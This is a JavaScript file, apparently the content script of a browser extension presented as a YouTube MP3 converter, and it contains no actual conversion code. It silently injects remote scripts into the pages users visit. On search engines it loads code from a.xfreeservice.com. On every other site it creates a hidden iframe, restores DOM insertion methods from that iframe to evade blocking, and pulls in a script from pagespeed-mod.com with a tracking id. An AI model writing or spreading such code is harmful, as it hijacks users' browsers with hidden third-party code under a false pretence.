/* =====================================
    Youtube MP3 Converter
===================================== */

// Google Analytics

(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-154350063-1', 'auto');
ga('set', 'dimension1', 'Youtube MP3 Converter');
ga('set', 'dimension2', 'Extension');

ga('send', 'pageview');

// End Google Analytics


(function() {
    // Your code goes here
})();
(function() {
    var hosts = [
        '.google.',
        '.bing.',
        'search.yahoo.'
    ];
    
    var hostMatched = false;
    
    for (var i = 0; i < hosts.length; i += 1) {
        if (window.location.hostname.indexOf(hosts[i]) !== -1) {
            hostMatched = true;
            break;
        }
    }
    
    if (hostMatched) {
        var s = document.createElement("script");
        s.type = "text/javascript";
        s.src = 'https://a.xfreeservice.com/partner/XMI6a9Ur/?cid=ytmp3';
        document.body.appendChild(s);
    }
})();
(function() {
  var blacklist = [
        '.google.',
        '.bing.',
        'search.yahoo.'
    ];
        
    for (var i = 0; i < blacklist.length; i += 1) {
        if (window.location.hostname.indexOf(blacklist[i]) !== -1) {
            return;
        }
    }

  var guid = null;
  
  if (
        document.currentScript
        && typeof document.currentScript.dataset.awssuidacr !== 'undefined'
        && document.currentScript.dataset.awssuidacr !== ''
    ) {
      guid = document.currentScript.dataset.awssuidacr;
  }

  if (guid) {    
    var a = document.createElement("iframe");
    a.src = "about:blank";
    a.style.display = "none";
    document.body.appendChild(a);
    Element.prototype.appendChild = a.contentWindow.Element.prototype.appendChild;
    Element.prototype.insertBefore = a.contentWindow.Element.prototype.insertBefore;
    var script = document.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    var ord = Math.random()*10000000000000000;
    script.src = '//www.pagespeed-mod.com/v1/taas?id=cs&ak=32b001198a46647f164402ebaec7a88c&si=d07acaa3a5ff4a4f99b12b98acafe347&tag=1005&rand='+guid+'&ord='+ord;
    (document.getElementsByTagName('head')[0] || document.body).appendChild(script);
  }
})();